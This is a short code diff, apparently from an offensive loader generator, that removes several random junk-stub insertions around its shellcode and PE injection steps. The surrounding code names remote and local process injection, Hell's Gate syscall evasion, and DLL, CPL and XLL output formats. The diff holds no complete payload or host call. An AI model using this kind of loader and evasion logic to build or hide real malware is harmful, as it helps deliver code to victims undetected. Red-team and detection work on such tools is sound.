@@ -3960,14 +3960,11 @@ if (peload):
                 stub.add(ShellcodeRemoteInjectMapSection)
             else:
                 stub.add(ShellcoderemoteinjectStub)
-            stub.add(getRandStub())
-            stub.add(getRandStub())
 
 if (shellcode):
     if (localinject):
         stub.add(getRandStub())
         stub.add(LocalInjectStub)
-        stub.add(getRandStub())
     else:
         stub.add(getRandStub())
         if (hellsgate):
@@ -4061,7 +4058,6 @@ if (shellcode):
             stub.add(ShellcodeRemoteInjectMapSection)
         else:
             stub.add(ShellcoderemoteinjectStub)
-        stub.add(getRandStub())
 
 if(dll_out or cpl or xll):
     if ((hide == false) and (apiHide == false)):
